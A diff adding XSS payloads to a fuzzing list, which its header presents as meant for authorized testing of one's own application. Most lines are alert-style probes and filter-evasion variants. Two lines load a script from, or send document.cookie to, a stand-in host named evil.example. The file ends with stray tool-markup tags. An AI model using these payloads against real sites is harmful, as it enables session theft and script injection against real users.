@@ -1,3 +1,6 @@
+# XSS payloads — for authorized testing of YOUR OWN application
+# Sourced from OWASP XSS cheatsheet + PortSwigger XSS reference (public, well-known)
+# Each line is one payload. Comments (#) and blanks ignored.
 <script>alert(1)</script>
 "><script>alert(1)</script>
 <img src=x onerror=alert(1)>
@@ -14,3 +17,40 @@ javascript:alert(1)
 <a href="javascript:alert(1)">click</a>
 {{7*7}}
 ${7*7}
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x to=1>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>x</marquee>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<embed src=javascript:alert(1)>
+<object data=javascript:alert(1)>
+<form action=javascript:alert(1)><button>x</button></form>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<input onfocus=alert(1) autofocus>
+<isindex action=javascript:alert(1)>
+<base href=javascript:alert(1)//>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<link rel=stylesheet href=javascript:alert(1)>
+<style>@import "javascript:alert(1)";</style>
+<style>body{background:url("javascript:alert(1)")}</style>
+%3Cscript%3Ealert(1)%3C/script%3E
+&#60;script&#62;alert(1)&#60;/script&#62;
+<script>alert(1)</script>
+"><svg/onload=confirm(1)>
+"><img src=1 onerror=eval(atob('YWxlcnQoMSk='))>
+<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>
+"-confirm(1)-"
+';alert(1);//
+"><script src=//evil.example/x.js></script>
+<img src=x onerror="this.src='//evil.example/?'+document.cookie">
+<img src=`x` onerror=`alert(1)`>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<IMG """><SCRIPT>alert(1)</SCRIPT>">
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+</content>
+</invoke>
